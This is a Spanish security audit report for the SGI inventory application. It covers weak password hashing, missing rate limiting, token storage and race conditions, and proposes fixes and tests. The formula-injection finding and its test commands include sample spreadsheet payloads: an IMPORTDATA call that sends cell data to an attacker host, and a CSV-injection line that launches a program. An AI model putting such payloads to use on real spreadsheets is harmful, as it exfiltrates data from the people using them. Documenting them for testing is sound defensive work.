# Auditoría de Seguridad — SGI Inventario GAP
## Fecha: 2026-06-18 | Rama: `dev`

---

## Resumen Ejecutivo

Se realizó una auditoría de seguridad estática completa del código fuente del proyecto SGI (backend GAS + frontend Vue 3 / Quasar). Se analizaron los siguientes archivos críticos:

**Backend (Google Apps Script):** `auth.js`, `main.js`, `config.js`, `sheets.js`, `AccessService.js`, `UsuarioService.js`, `ProductoService.js`, `MovimientoService.js`, `InventarioService.js`, `CatalogoService.js`, `SucursalService.js`, `DocumentoVentaService.js`, `ReporteService.js`, `LogService.js`, `PermisoService.js`, `FacturaService.js`

**Frontend (Vue 3 / TypeScript):** `api.ts`, `authStore.ts`, `router/index.ts`, `router/guards.ts`, `boot/axios.ts`

**Configuración:** `.gitignore`

**Resultado general:** El sistema tiene una arquitectura de seguridad sólida con algunas vulnerabilidades de severidad media y baja que deben corregirse. No se detectaron vulnerabilidades críticas inmediatas, pero existen patrones de riesgo que deben atenderse antes de producción.

---

## Rama Git

```
Rama auditada: dev
Commit de referencia: HEAD (sin modificaciones de código)
```

---

## Checklist de Auditoría

| Área | Estado | Observación |
|------|--------|-------------|
| Autenticación JWT | ✅ BIEN | HMAC-SHA256 implementado correctamente |
| Expiración de tokens | ✅ BIEN | TTL 8h con validación `exp` |
| Hash de contraseñas | ⚠️ RIESGO MEDIO | SHA-256 simple, sin salt por usuario |
| Acciones públicas sin token | ⚠️ RIESGO MEDIO | Sin rate-limiting ni validación de input |
| Control de acceso por sucursal | ✅ BIEN | Validación doble (frontend + backend) |
| Sistema de permisos granular | ✅ BIEN | RBAC robusto con AccessService |
| Exposición de datos sensibles | ⚠️ RIESGO MEDIO | `precio_compra` expuesto bajo permiso |
| Sanitización de inputs backend | ⚠️ RIESGO MEDIO | Sin sanitización contra XSS / inyección |
| Inyección de fórmulas en Sheets | 🔴 RIESGO ALTO | Datos del usuario se escriben directamente |
| Manejo de errores con info sensible | ⚠️ RIESGO MEDIO | Mensajes de error revelan estructura interna |
| Token en localStorage / Quasar LS | ⚠️ RIESGO MEDIO | Susceptible a XSS si ocurre |
| Validación de Content-Type | ✅ BIEN | `text/plain` evita CORS preflight |
| Guards de ruta frontend | ✅ BIEN | Protección por permisos en todas las rutas |
| Acceso a rutas públicas | ⚠️ RIESGO MEDIO | Sin filtro por país/IP, sin rate limiting |
| Soft-delete sin restricción extra | ⚠️ RIESGO BAJO | Usuarios inactivos siguen en Sheets |
| Logs de auditoría | ✅ BIEN | LogService cubre todas las operaciones CRUD |
| Backup diario automático | ✅ BIEN | Configurado en guía de producción |
| `.gitignore` de credenciales | ✅ BIEN | `.env.production` y `.env.local` excluidos |
| SPREADSHEET_ID en Script Properties | ✅ BIEN | No está hardcodeado en código |
| JWT_SECRET en Script Properties | ✅ BIEN | Cargado vía `getProperty` |
| Número de factura sin lock | ⚠️ RIESGO MEDIO | Race condition posible en concurrencia |
| `doGet` expone versión/env | ⚠️ RIESGO BAJO | Ping público revela ENV y versión |
| Eliminación física de líneas (`delete`) | ⚠️ RIESGO BAJO | `Sheets.delete` elimina datos sin recovery |
| Timeout de sesión en frontend | ✅ BIEN | `isAuthenticated` valida `expiresAt` |
| Sucursal en token (backend) | ✅ BIEN | Sesión incluye `sucursalId` y `isGlobal` |

---

## Detalles de Hallazgos

---

### 🔴 ALTO — Inyección de Fórmulas en Google Sheets (Formula Injection)

**Archivo:** `backend/src/db/sheets.js` → `insert()`, `insertMany()`, `update()`

**Descripción:**  
Los datos ingresados por el usuario (nombres de productos, clientes, referencias, notas, etc.) se escriben directamente en las celdas de Google Sheets sin ninguna sanitización previa. Si un valor comienza con `=`, `+`, `-`, o `@`, Google Sheets lo interpreta como una fórmula.

**Ejemplo de riesgo:**
```
nombre del producto: =IMPORTDATA("https://attacker.com/exfil?data="&A1)
cliente:             =HYPERLINK("http://malicious.com","Click aqui")
notas:               +cmd|' /C calc'!A0   (payload de CSV injection)
```

Esto podría permitir:
- Exfiltración de datos del spreadsheet a un servidor externo.
- Ejecución de funciones de Sheets que consuman cuota.
- En exportaciones CSV, ataques de CSV Injection contra usuarios que abran el archivo.

**Dónde ocurre concretamente:**
- `ProductoService.create` / `update` → campos `nombre`, `descripcion`, `marca`, `qr_code`
- `DocumentoVentaService.create` → campo `cliente`, `notas`, `observaciones`
- `MovimientoService` → campo `referenciaTexto`, `notas`, `detalleAccion`
- `UsuarioService.create` → campo `nombre`
- `LogService.registrar` → campo `detalle`

**Corrección recomendada:**
```javascript
// En sheets.js — sanitizar antes de escribir
function sanitizeCellValue(value) {
  if (typeof value !== 'string') return value
  // Prefijos de fórmula en Sheets / CSV injection
  const dangerousChars = ['=', '+', '-', '@', '\t', '\r']
  if (dangerousChars.some(c => value.startsWith(c))) {
    return "'" + value  // Apostrofe fuerza interpretación como texto
  }
  return value
}
```
Aplicar en `insert()` e `insertMany()` al mapear los valores de la fila.

---

### ⚠️ MEDIO — Hash de Contraseñas sin Salt por Usuario

**Archivo:** `backend/src/auth.js` → `_sha256()`, y `UsuarioService.js` → `_sha256()`

**Descripción:**
Las contraseñas se hashean con SHA-256 usando `password + CONFIG.JWT_SECRET` como concatenación. Si bien el `JWT_SECRET` actúa como salt global, **no hay un salt único por usuario**. Esto significa que:

1. Dos usuarios con la misma contraseña tendrán el mismo `password_hash`.
2. Si el `JWT_SECRET` se ve comprometido, todos los hashes son vulnerables simultáneamente.
3. SHA-256 es un algoritmo de hash rápido, no diseñado para almacenamiento de contraseñas (sin iteraciones de trabajo).

**Corrección recomendada:**
- **Corto plazo (dentro de GAS):** Agregar un salt aleatorio por usuario almacenado en la hoja `Usuarios`:
```javascript
create(payload, session) {
  const salt = Utilities.getUuid()  // Salt único por usuario
  const passwordHash = this._sha256(payload.password + salt + CONFIG.JWT_SECRET)
  const nuevo = {
    ...
    password_hash: passwordHash,
    password_salt: salt,  // Nueva columna en hoja Usuarios
  }
}
```
- **Largo plazo:** Migrar a bcrypt u otro KDF lento si el entorno lo permite, o delegar auth a Google Identity / OAuth.

---

### ⚠️ MEDIO — Sin Rate Limiting en Acciones Públicas y Login

**Archivo:** `backend/src/main.js` → `doPost()`

**Descripción:**
Las acciones `login`, `getProductoBySku` y `getCategorias` no tienen ningún mecanismo de rate limiting. Esto permite:

- **Ataques de fuerza bruta al login:** Un atacante puede probar miles de combinaciones email/password sin restricción.
- **Enumeración de productos públicos:** Escaneo automatizado del catálogo completo por SKU.
- **Abuso de cuota de GAS:** Peticiones masivas pueden agotar la cuota gratuita de Google Apps Script (6 minutos/ejecución, 90 horas/día).

**Corrección recomendada:**
```javascript
// Usar CacheService para rate limiting simple por IP
// NOTA: GAS no expone IP del cliente, usar fingerprint de sesión o email como key

function checkLoginRateLimit(email) {
  const cache = CacheService.getScriptCache()
  const key = 'rl_login_' + Utilities.computeDigest(
    Utilities.DigestAlgorithm.SHA_256, email
  ).map(b => ('0' + (b & 0xFF).toString(16)).slice(-2)).join('').slice(0, 16)

  const attempts = Number(cache.get(key) || 0)
  if (attempts >= 5) throw new Error('Demasiados intentos. Intente en 5 minutos.')
  cache.put(key, String(attempts + 1), 300)  // 5 minutos
}
```

---

### ⚠️ MEDIO — Mensajes de Error Revelan Estructura Interna

**Archivo:** `backend/src/main.js` → bloque `catch`, varios servicios

**Descripción:**
Los mensajes de error del sistema exponen información interna que podría ser aprovechada por un atacante para mapear la estructura del sistema:

```javascript
// En main.js
return respond(status, err.message)  // Expone el mensaje completo del error

// Ejemplos de mensajes actuales que se envían al cliente:
"Hoja no encontrada: UsuarioRoles"     // Revela nombre de hoja
"Usuario no encontrado: abc-123"       // Confirma que el ID existe/no existe
"SKU existente, omitido"               // Enumerable
"Script Property no configurada: JWT_SECRET"  // Revela configuración
```

**Corrección recomendada:**
```javascript
// En main.js — diferenciar errores internos de errores de usuario
function doPost(e) {
  try {
    // ... lógica ...
  } catch (err) {
    Logger.log('ERROR doPost: ' + err.message + '\n' + err.stack)
    
    // Errores que SÍ deben mostrarse al usuario (son de validación/negocio)
    const userFacingErrors = [
      'Token', 'autorizado', 'permiso', 'requerido', 'no encontrado',
      'inválido', 'incorrecto', 'inactivo', 'existente', 'insuficiente'
    ]
    const isUserError = userFacingErrors.some(kw => err.message.includes(kw))
    
    const status = err.message.includes('Token') || err.message.includes('autorizado') ? 401 : 
                   isUserError ? 400 : 500
    const message = isUserError ? err.message : 'Error interno del servidor'
    return respond(status, message)
  }
}
```

---

### ⚠️ MEDIO — Token de Sesión en LocalStorage (XSS Risk)

**Archivo:** `frontend/src/stores/authStore.ts`

**Descripción:**
La sesión se persiste con `LocalStorage.set(SESSION_KEY, nuevaSesion)` de Quasar, que internamente usa `window.localStorage`. Si el sistema sufre una vulnerabilidad XSS (Cross-Site Scripting), el token JWT completo quedaría expuesto y podría ser robado.

```typescript
// authStore.ts — almacenamiento actual
LocalStorage.set(SESSION_KEY, nuevaSesion)   // Usa localStorage, vulnerable a XSS
```

El riesgo se mitiga parcialmente porque:
- El sistema usa Quasar SPA con CSP implícito.
- No hay `innerHTML` dinámico con datos del usuario visible en el código revisado.
- GAS con `text/plain` como Content-Type evita algunos vectores.

**Corrección recomendada (a evaluar según complejidad):**
- **Opción A (mínimo esfuerzo):** Almacenar solo el `userId` y `rol` en localStorage; el token completo en `sessionStorage` (se limpia al cerrar la pestaña).
- **Opción B (más seguro):** Usar cookies `HttpOnly` para el token (requiere cambios en la arquitectura de GAS que dificultan la implementación actual).
- **Opción C (pragmático para este stack):** Agregar validación de integridad: al cargar la sesión, verificar que `expiresAt` no haya sido manipulado.

```typescript
// Validación adicional al cargar sesión
const storedSession = LocalStorage.getItem(SESSION_KEY) as SesionUsuario | null
if (storedSession) {
  // Verificar coherencia básica antes de confiar en la sesión almacenada
  const isValid = storedSession.token && 
                  storedSession.expiresAt && 
                  typeof storedSession.rol === 'string' &&
                  Date.now() < storedSession.expiresAt
  sesion.value = isValid ? storedSession : null
  if (!isValid) LocalStorage.remove(SESSION_KEY)
}
```

---

### ⚠️ MEDIO — Race Condition en Generación de Número de Documento

**Archivo:** `backend/src/services/DocumentoVentaService.js` → `_generarNumero()`

**Descripción:**
La generación del número correlativo de facturas / documentos se basa en contar los registros existentes del mismo tipo y sumar 1:

```javascript
_generarNumero(tipo) {
  const config = this._getTypeConfig(tipo)
  const existentes = Sheets.getAll(this.SHEET_FACTURAS)
    .filter(row => row.tipo === tipo)
  return config.numeroPrefix + String(existentes.length + 1).padStart(6, '0')
}
```

Si dos usuarios crean una factura casi simultáneamente (posible en POS con varios vendedores activos), ambas leerán el mismo conteo y generarán el **mismo número correlativo**, creando duplicados.

**Corrección recomendada:**
```javascript
// Usar un contador en la hoja Config con bloqueo optimista
_generarNumero(tipo) {
  const config = this._getTypeConfig(tipo)
  const clave = 'correlativo_' + tipo.toLowerCase()
  
  // Leer correlativo actual
  const configRow = Sheets.getBy('Config', 'clave', clave)
  const siguiente = configRow ? (Number(configRow.valor) + 1) : 1
  
  // Actualizar inmediatamente (GAS es single-threaded por ejecución)
  if (configRow) {
    Sheets.update('Config', configRow.id, { valor: String(siguiente) })
  } else {
    Sheets.insert('Config', { 
      id: Sheets.generateId(), 
      clave: clave, 
      valor: String(siguiente), 
      descripcion: 'Correlativo ' + tipo 
    })
  }
  
  return config.numeroPrefix + String(siguiente).padStart(6, '0')
}
```

---

### ⚠️ MEDIO — `SucursalService.getAll()` sin Autenticación

**Archivo:** `backend/src/services/SucursalService.js` → `getAll()`  
**Archivo:** `backend/src/main.js` → ruta `'getSucursales'`

**Descripción:**
La acción `getSucursales` llama a `SucursalService.getAll()` que **no recibe ni valida la sesión**. Aunque `getSucursales` sí pasa por `Auth.verifyToken(token)` (es una acción protegida, no pública), el servicio mismo no tiene guard interno. Si por error se agrega al listado de `ACCIONES_PUBLICAS`, quedará completamente expuesto.

Adicionalmente, `getAll()` retorna **todas las sucursales incluyendo las inactivas**, lo que no debería ser visible para roles no administrativos.

**Corrección recomendada:**
```javascript
// SucursalService.getAll() — agregar sesión y filtrar según rol
getAll(payload, session) {
  const todas = Sheets.getAll('Sucursales').map(this._mapear)
  
  // Solo Admin/Supervisor ven las inactivas
  if (!session || (session.rol !== 'ADMINISTRADOR' && session.rol !== 'SUPERVISOR')) {
    return todas.filter(s => s.activo)
  }
  return todas
},
```
Y actualizar la firma en `main.js`: `'getSucursales': () => SucursalService.getAll(payload, session)`

---

### ⚠️ MEDIO — `getProductos` y `getProveedores` sin Control de Acceso Explícito

**Archivo:** `backend/src/services/ProductoService.js` → `getAll()`  
**Archivo:** `backend/src/services/ProveedorService.js` → `getAll()`

**Descripción:**
Estas acciones no verifican ningún permiso ni sesión. Si bien requieren token válido (están en el router protegido), cualquier usuario autenticado independientemente de su rol puede leer el catálogo completo de productos (incluyendo `precioCompra`) y todos los proveedores.

**Corrección recomendada:**
```javascript
// ProductoService.getAll() — agregar guard de permiso
getAll(payload, session) {
  AccessService.assert(session, 'productos.ver', 'Sin permiso para ver productos')
  // ... resto del código
}
```

---

### ⚠️ BAJO — `doGet` Expone Información del Sistema

**Archivo:** `backend/src/main.js` → `doGet()`

**Descripción:**
```javascript
function doGet(e) {
  if (!action || action === 'ping') {
    return respond(200, 'SGI API OK', {
      version: '1.1.0', 
      timestamp: new Date().toISOString(), 
      env: CONFIG.ENV,   // ← Expone si es 'development' o 'production'
    })
  }
}
```
Cualquier persona que conozca la URL del GAS puede hacer un GET y descubrir la versión y el entorno del sistema.

**Corrección recomendada:**
```javascript
function doGet(e) {
  // Solo responder con OK sin detalles internos
  return respond(200, 'SGI API OK', { status: 'running' })
}
```

---

### ⚠️ BAJO — Eliminación Física de Líneas sin Registro de Auditoría

**Archivo:** `backend/src/db/sheets.js` → `delete()`  
**Archivo:** `backend/src/services/MovimientoService.js` → `_deleteMovementLines()`

**Descripción:**
`Sheets.delete()` elimina físicamente una fila del spreadsheet. Las líneas de movimientos eliminadas durante un `updateMovimiento` se borran permanentemente. Si bien el resultado final se regenera, no queda rastro de las líneas eliminadas en `LogAcciones`.

**Corrección recomendada:**
Antes de llamar `Sheets.delete()` en movimientos, registrar las líneas que se van a eliminar:
```javascript
_deleteMovementLines(cabeceraId) {
  const lineas = Sheets.getAll(this.SHEET_MOVIMIENTOS)
    .filter(item => String(item.cabecera_id) === String(cabeceraId))
  
  // Audit trail antes de eliminar
  lineas.forEach(item => {
    LogService.registrar('SYSTEM', 'DELETE_LINE', this.SHEET_MOVIMIENTOS, 
      item.sucursal_origen || item.sucursal_destino || null,
      'Línea eliminada (reemplazo): id=' + item.id + 
      ' prod=' + item.producto_id + ' cant=' + item.cantidad)
  })
  
  lineas.forEach(item => Sheets.delete(this.SHEET_MOVIMIENTOS, item.id))
},
```

---

### ⚠️ BAJO — `_validarPermisoImportacion` Usa Comparación de Rol Legacy

**Archivo:** `backend/src/services/ProductoService.js` → `_validarPermisoImportacion()`

**Descripción:**
```javascript
_validarPermisoImportacion(session) {
  if (session.rol !== 'ADMINISTRADOR' && session.rol !== 'SUPERVISOR') {
    throw new Error('Sin permiso para importar productos en masa')
  }
}
```
Esta validación ignora el sistema de permisos granular (`AccessService`) y hardcodea los roles. Si se crea un rol personalizado con permiso `productos.importar`, no podrá importar porque la validación solo acepta los dos roles específicos.

**Corrección recomendada:**
```javascript
_validarPermisoImportacion(session) {
  AccessService.assert(session, 'productos.importar', 'Sin permiso para importar productos en masa')
},
```

---

### ✅ BIEN — Aspectos de Seguridad Confirmados como Correctos

Los siguientes aspectos fueron revisados y están **correctamente implementados**:

1. **JWT con HMAC-SHA256:** La implementación en `auth.js` es correcta: header.payload.signature, verificación de firma antes de decodificar payload.

2. **Validación de `sucursal_id` en backend:** `AccessService.canInSucursal()` y `assertInSucursal()` validan el acceso a nivel de sucursal en todas las operaciones críticas (inventario, catálogo, movimientos, facturas).

3. **Datos públicos filtrados en `_getProductoBySkuPublico`:** Se omiten correctamente `precioCompra` y `stock` de la respuesta pública.

4. **Guards de ruta en frontend:** Todas las rutas privadas tienen `beforeEnter: permissionGuard()` o `authGuard()`. La ruta pública `/producto/:sku` tiene `meta: { public: true }` y es ignorada correctamente por `authGuard`.

5. **Token inyectado en interceptor Axios:** El `request.use()` en `api.ts` agrega el token de forma centralizada. No hay servicios que lo manejen manualmente.

6. **Sesión expirada detectada en frontend:** `isAuthenticated` en `authStore.ts` valida `Date.now() < sesion.expiresAt`.

7. **Respuesta 401 redirige al login:** El response interceptor en `api.ts` detecta `error.response?.status === 401` y llama a `authStore.logout()` + redirect a `/login`.

8. **`.gitignore` correcto:** `.env.production`, `.env.local` y `.env.*.local` están excluidos del repositorio.

9. **Script Properties para credenciales:** `SPREADSHEET_ID` y `JWT_SECRET` se cargan vía `PropertiesService`, nunca están hardcodeados.

10. **Sistema RBAC granular:** `AccessService` implementa permisos por código (`productos.crear`, `inventario.entrada`, etc.) con soporte de scopes por sucursal. El sistema legacy por roles se mantiene como fallback compatible.

11. **LogService en todas las operaciones críticas:** CREATE, UPDATE, DELETE, LOGIN, UPLOAD quedan registrados con `usuarioId`, `accion`, `modulo`, `sucursalId` y `detalle`.

12. **Soft-delete implementado:** Usuarios, sucursales y productos usan `activo: false` en lugar de eliminación física (excepto líneas de movimiento, mencionado en hallazgos).

---

## Archivos Creados

| Archivo | Descripción |
|---------|-------------|
| `docs/resultados/auditoria-seguridad-2026-06-18.md` | Este documento |

## Archivos Modificados

Ninguno — auditoría de solo lectura.

---

## Pruebas de Test Recomendadas

Para validar las correcciones una vez implementadas:

```bash
# 1. Fuerza bruta en login — debe bloquearse tras 5 intentos
curl -X POST $GAS_URL -d '{"action":"login","payload":{"email":"admin@test.com","password":"wrong"}}'
# Repetir 6 veces → el 6to debe retornar error de rate limit

# 2. Formula injection — no debe ejecutarse como fórmula en Sheets
curl -X POST $GAS_URL -d '{"action":"createProducto","token":"...","payload":{"sku":"TEST-INJECT","nombre":"=IMPORTDATA(\"https://evil.com/\")","precioFinal":10}}'
# Verificar en Sheets que el valor aparece como texto, no como fórmula

# 3. Acceso a sucursal no autorizada
curl -X POST $GAS_URL -d '{"action":"getCatalogo","token":"TOKEN_VENDEDOR_SUCURSAL_A","payload":{"sucursal_id":"ID_SUCURSAL_B"}}'
# Debe retornar 401 / "Acceso no autorizado"

# 4. Endpoint público sin token
curl -X POST $GAS_URL -d '{"action":"getProductoBySku","payload":{"sku":"PROD-001"}}'
# Debe retornar datos sin precio_compra ni stock

# 5. Número de factura duplicado (concurrencia)
# Crear dos facturas simultáneas y verificar que los números sean distintos
```

---

## Notas de Ejecución

- La auditoría fue realizada **sin modificar ningún archivo** del proyecto.
- Se analizó el código estático; no se realizaron pruebas dinámicas de penetración.
- El sistema de GAS no permite inspección de runtime sin deployment.
- Los archivos de entorno (`.env.production`, `Script Properties`) no estuvieron disponibles para revisión, lo cual es correcto desde el punto de vista de seguridad.

---

## Problemas Identificados — Resumen Priorizado

| # | Severidad | Hallazgo | Archivo Principal |
|---|-----------|----------|-------------------|
| 1 | 🔴 ALTO | Formula Injection en Google Sheets | `sheets.js` |
| 2 | ⚠️ MEDIO | Hash sin salt por usuario | `auth.js`, `UsuarioService.js` |
| 3 | ⚠️ MEDIO | Sin rate limiting en login / acciones públicas | `main.js` |
| 4 | ⚠️ MEDIO | Mensajes de error revelan estructura interna | `main.js`, servicios |
| 5 | ⚠️ MEDIO | Token JWT en localStorage (riesgo XSS) | `authStore.ts` |
| 6 | ⚠️ MEDIO | Race condition en número correlativo de documentos | `DocumentoVentaService.js` |
| 7 | ⚠️ MEDIO | `getSucursales` sin filtro por rol ni guard interno | `SucursalService.js` |
| 8 | ⚠️ MEDIO | `getProductos` y `getProveedores` sin guard de permiso | `ProductoService.js` |
| 9 | ⚠️ BAJO | `doGet` expone versión y entorno | `main.js` |
| 10 | ⚠️ BAJO | Eliminación física sin audit trail | `sheets.js`, `MovimientoService.js` |
| 11 | ⚠️ BAJO | `_validarPermisoImportacion` ignora AccessService | `ProductoService.js` |

---

## Recomendaciones

### Inmediatas (antes de producción)

1. **[CRÍTICO] Sanitizar valores antes de escribir en Sheets** para prevenir Formula Injection. Es la única vulnerabilidad clasificada como ALTO. Un parche de 10 líneas en `sheets.js` → función `sanitizeCellValue()` aplicada en `insert()` e `insertMany()`.

2. **Agregar salt por usuario en hashes de contraseña.** Requiere una nueva columna `password_salt` en la hoja `Usuarios` y migración de los hashes existentes.

3. **Rate limiting en el endpoint de login** usando `CacheService` con ventana de 5 minutos y máximo 5 intentos por email/IP.

4. **Sanitizar mensajes de error** en `doPost()` diferenciando errores de usuario (400) de errores internos (500), mostrando mensaje genérico para los internos.

### Corto plazo (sprint siguiente)

5. **Corregir `_generarNumero()`** en `DocumentoVentaService` para usar correlativo en `Config` en lugar de conteo de registros.

6. **Agregar `session` y `AccessService.assert` en `getAll()`** de `SucursalService`, `ProductoService` y `ProveedorService`.

7. **Usar `AccessService.assert(session, 'productos.importar')` en `_validarPermisoImportacion()`** en lugar de comparación de rol hardcodeado.

8. **Minimizar información en `doGet`**: eliminar `version` y `env` del ping público.

### Mediano plazo

9. **Evaluar migración de token de localStorage a sessionStorage** o implementar validación de integridad adicional al cargar la sesión.

10. **Audit trail antes de `Sheets.delete()`** en líneas de movimiento para mantener trazabilidad completa.

11. **Revisar política de retención de `LogAcciones`**: sin un proceso de archivado, la hoja puede crecer indefinidamente degradando el rendimiento.

---

## Cómo Implementar las Correcciones

Las correcciones identificadas **no requieren modificaciones de arquitectura**. Se implementan de forma quirúrgica en los archivos indicados. El orden recomendado:

```
1. backend/src/db/sheets.js         → Función sanitizeCellValue() en insert/insertMany
2. backend/src/auth.js              → Salt por usuario en _sha256
3. backend/src/services/UsuarioService.js → Salt al crear/actualizar usuario
4. backend/src/main.js              → Rate limiting en login + sanitizar errores + doGet simplificado
5. backend/src/services/DocumentoVentaService.js → _generarNumero() con correlativo en Config
6. backend/src/services/SucursalService.js → getAll(payload, session) con filtro por rol
7. backend/src/services/ProductoService.js → assert('productos.ver') + assert('productos.importar')
8. frontend/src/stores/authStore.ts → Validación de integridad al cargar sesión de localStorage
```

Cada corrección debe ir en un commit separado con mensaje:
```
fix(security): [descripción específica del hallazgo]
```

Y documentarse en un archivo `docs/resultados/fix-seguridad-YYYY-MM-DD.md` con el checklist de cambios.

---

*Auditoría realizada: 2026-06-18 | SGI v1.1 | Rama: dev | Modo: solo lectura, sin modificación de código*
